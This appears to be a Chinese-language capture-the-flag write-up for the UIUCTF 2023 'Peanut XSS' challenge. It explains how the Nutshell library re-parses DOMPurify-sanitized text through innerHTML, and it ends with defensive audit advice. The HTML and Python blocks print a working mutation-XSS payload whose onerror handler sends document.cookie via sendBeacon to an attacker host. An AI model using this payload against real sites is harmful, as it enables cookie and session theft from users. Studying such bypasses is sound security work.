# UIUCTF 2023 Peanut XSS Writeup

## 题目简述

页面从 `nutshell` 查询参数读取 HTML，先经过 DOMPurify，再放入预览区。管理员机器人会携带可由 JavaScript 读取的 `flag` cookie 访问选手提交的 URL。直接放入 `<script>`、事件属性或恶意 `<img>` 都会被清理，表面上不存在常规 XSS。

漏洞位于净化之后运行的第三方 Nutshell 库：它把已经安全的文本重新赋给 `innerHTML`，形成二次解析。只要先把标签编码成文本骗过 DOMPurify，Nutshell 随后就会把它重新解释成可执行 HTML。

## 解题过程

页面的处理顺序是：

```javascript
preview.innerHTML = DOMPurify.sanitize(nutshell);
```

Nutshell 会寻找文本以冒号开头的链接，将其改造成可展开组件。固定到题目所用版本的[源码](https://github.com/ncase/nutshell/blob/c182586d649153577b985dfd8dfab15e739130f6/nutshell.js#L540-L560)后，可以看到关键数据流：先读取 `ex.innerText`，再写入新节点的 `innerHTML`。

```javascript
let linkText = document.createElement('span');
linkText.innerHTML = ex.innerText.slice(ex.innerText.indexOf(':') + 1);
```

因此构造一个会被 Nutshell 识别的 `<a>`，并把真正的标签写成 HTML 实体：

```html
<a href="#ToWriteASection">:x&lt;img src=x onerror='navigator.sendBeacon("https://ATTACKER.example/leak",document.cookie)'&gt;</a>
```

执行过程如下：

1. DOMPurify 看到的危险部分只是锚文本中的 `&lt;img ...&gt;`，不会创建图片元素；
2. 浏览器读取 `ex.innerText` 时，实体已解码为字面文本 `<img ...>`；
3. Nutshell 把这段文本赋给 `linkText.innerHTML`，浏览器进行第二次 HTML 解析；
4. `src=x` 加载失败，`onerror` 执行并把 `document.cookie` 发送到攻击者服务器。

用 Python 生成最终 URL 可避免手工转义查询参数：

```python
from urllib.parse import quote

payload = r'''<a href="#ToWriteASection">:x&lt;img src=x onerror='navigator.sendBeacon("https://ATTACKER.example/leak",document.cookie)'&gt;</a>'''
print("https://peanut-xss-web.chal.uiuc.tf/?nutshell=" + quote(payload))
```

把生成的 HTTPS URL 提交给 bot。cookie 配置中 `httpOnly` 为 `false`，因此回连请求会包含：

```text
flag=uiuctf{cr4ck1ng_0open_somE_nuTsh3lls}
```

## 方法总结

这是典型的 mutation/二次解析型 XSS。安全性必须覆盖净化后的完整 DOM 生命周期：即使初始 HTML 已经净化，后续库若把 `innerText`、`textContent` 或属性值送回 `innerHTML`、`outerHTML`、`insertAdjacentHTML` 等解析 sink，攻击字符仍可能重新获得标签语义。审计第三方前端库时，搜索这些 sink，并沿数据流追踪是否经过“实体文本 → DOM 文本 → HTML 重解析”的转换。
